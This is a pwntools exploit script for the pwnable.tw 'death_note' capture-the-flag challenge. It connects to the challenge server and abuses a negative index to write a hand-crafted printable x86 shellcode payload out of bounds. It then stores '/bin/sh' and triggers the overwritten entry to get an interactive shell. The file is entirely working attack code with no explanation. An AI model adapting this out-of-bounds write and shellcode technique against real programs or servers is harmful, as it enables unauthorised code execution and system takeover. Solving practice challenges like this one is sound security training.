from pwn import *
import time

def add_name(index, name):
    s.recvuntil(":")
    s.send("1\n")
    s.recvuntil(":")
    s.send(str(index)+"\n")
    s.recvuntil(":")
    s.send(name+"\n")


def show_name(index):
    s.recvuntil(":")
    s.send("2\n")
    s.recvuntil(":")
    s.send(str(index)+"\n")

def delete_name(index):
    s.recvuntil(":")
    s.send("3\n")
    s.recvuntil(":")
    s.send(str(index)+"\n")

#s=process("./death_note")
s=remote("chall.pwnable.tw",10201)
shellcode="\x79\x30"
shellcode+="\x50\x59\x43\x43\x43\x43\x43\x43\x43\x43\x43\x31\x59\x78\x6B\x51\x78\x63\x31\x59\x78\x31\x51\x78\x6B\x59\x78\x25\x31\x51\x78\x43\x43\x43\x43\x43\x43\x31\x59\x78\x50\x5B\x6B\x50\x70\x20\x6B\x48\x70\x20\x6B\x40\x70\x20\x40\x40\x40\x40\x40\x40\x40\x40\x40\x40\x40"
shellcode+="\x79\x23"
e = ELF.from_bytes(shellcode, vma=0xc000)
print(e.disasm(e.entry, 0x68))
print(len(shellcode))
add_name(1,"/bin/sh\x00")
add_name(-19, shellcode)
pause()
delete_name("1")
s.interactive()
s.close()
